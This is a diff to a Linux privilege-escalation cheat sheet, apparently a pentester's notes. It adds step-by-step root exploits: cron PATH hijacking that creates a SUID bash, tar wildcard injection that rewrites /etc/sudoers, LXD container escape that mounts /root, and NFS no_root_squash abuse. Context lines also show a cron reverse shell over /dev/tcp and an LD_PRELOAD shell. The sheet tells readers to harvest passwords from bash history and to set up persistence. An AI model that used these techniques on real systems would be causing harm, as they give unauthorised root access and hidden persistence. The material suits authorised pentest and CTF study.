@@ -1,7 +1,6 @@
 ### File Permissions
 ```bash
 ## r=Readable w=Writable x=Executable -=Denied
-
 ## Example:
 $ ls -l file
    -rw-r--r-- 1 root root 
@@ -60,6 +59,7 @@ sudo LD_PRELOAD=/tmp/shell.so vim
 ```
 
 ## Cronjobs
+#### Misconfigured cronjobs
 ```bash
 ## View all cronjobs
 cat /etc/crontab
@@ -74,4 +74,146 @@ bash -i >& /dev/tcp/0.0.0.0/4444 0>&1
 
 ## Save the file and start nc listener on port 4444 on local host
 ## wait for crobjob to run to connect back to your local host
+```
+
+#### PATH Environment Variables
+```bash
+## run cat /etc/crontab to see what PATH is available.
+## There can be multiple PATHS.
+## When a cronjob does not have an absolute PATH assigned to it, it will ## look for the file in all available PATHS specfied (if not found in first, move on to next PATH and so).
+## Example: PATH=/home/50cent:/usr/local/sbin:/usr/local/bin
+## First PATH is our home directory.
+
+cd /home/50cent
+nano same-file-name-as-cronjob.sh
+
+#!/bin/bash
+
+cp /bin/bash /tmp/dirtyroot
+chmod +xs /tmp/dirtyroot
+
+## Save file. +xs =  the owner of file will run.
+chmod +x same-file-name-as-cronjob.sh
+
+## Once cronjob runs, check to see in /tmp if a file called dirtyroot was created
+
+/tmp/dirtyroot -p
+## -p = execute this binary as owner of the file (root)
+id
+```
+
+### Wildcard Injection
+```bash
+## You find a cronjob executing the following:
+
+#!/bin/sh
+
+cd /home/<USERNAME>
+tar czf /tmp/backup-new.tar.gz *
+
+## A wildcard (*) is at the end of the cronjob. Nioce
+## cd into your /home directory as this is where the cronjob goes when executed
+cd
+## Paste the following
+echo 'echo "<USERNAME> ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > priv.sh
+## Then this
+echo "" > "--checkpoint-action=exec=sh priv.sh"
+## Followed with this
+echo "" > --checkpoint=1
+## Change permissions to anyone can execute (+x)
+chmod +x priv.sh
+## Wait for the cronjob to run and check permissions
+sudo -l
+## you should see:
+(root) NOPASSWD: ALL
+## Escalate to root priv
+sudo su
+id
+```
+
+### Bash History File
+```bash
+## Check the users bash history file for passwords
+cat ~/.history
+cat ~/.bash_history
+```
+
+### Configuration Files
+```bash
+## Check for files in user home directories that aren't default files in Linux systems.
+## Example: cd to users home directory that you got access as, if theres a folder called vpn_files in the home directory, investigate the files in the folder as it may contain credentials. A quote from a peer of mine in my pentesting days: "50% of pentesting is looking through smb shares for credentials." 
+```
+
+### LXD Linux Containers
+```bash
+## Wtf is LXD: It's a container manager for Linux systems. Think of it like Docker
+
+## Check if user is part of lxd group:
+groups
+<USERNAME> adm cdrom dip plugdev lxd
+
+## Download this to local host
+sudo git clone https://github.com/saghul/lxd-alpine-builder
+
+cd lxd-alpine-builder
+sudo ./build-alpine
+
+## Transfer to victim host. start web server on local:
+python3 -m http.server 
+## victim host
+wget http://0.0.0.0:8000/alpine-v3.15-x86_64-20211219_1210.tar.gz
+
+lxd init 
+## answer all Q's with yes
+lxc image import alpine-v3.15-x86_64-20211219_1210.tar.gz --alias root
+
+## Check if image was imported
+lxc image list
+
+## Now create a container using the imported alpine image. -c = give user access to root
+lxc init root root-container -c security.privileged=true
+
+## Check container was created, should be offline
+lxc list
+
+##
+lxc config device add root-container mydevice disk source=/root path=/mnt/root recursive=true
+
+#start contrainer
+lxc start root-container
+lxc exec root-container /bin/sh
+id
+cd /mnt/root
+try create a user now with root priv to get persistence. Theres many things you can do to try to get persistence. 
+```
+
+### NFS
+```bash
+## Network File System
+## Confirm nfs ports are open on server
+## find nfs port open
+nmap -sV -A 0.0.0.0
+## show nfs export list
+showmount -e 0.0.0.0
+## On victim machine, check nfs config
+cat /etc/exports
+## no_root_squash specified on the nfs share? sweet.
+cd <DIR-OF-NFS-SHARED-FOLDER>
+## Copy the /bin/bash binary into your curret directory
+cp /bin/bash ./
+## Create a ahared directory on your attacker host
+mkdir /tmp/evilshare
+## Mount the nfs share onto your new evilshare
+sudo mount -o rw -t nfs <victim-ip-address:<DIR-OF-NFS-SHARED-FOLDER>> /tmp/evilshare
+cd /tmp/evilshare
+ls
+## bash binary should be inside folder
+sudo chown root.root bash
+sudo chown +s bash
+## Go back to victim host share
+ls -la bash
+## bash binary should be owned by root ands have suid permissions.
+./bash -p
+id
+cd /root
 ```
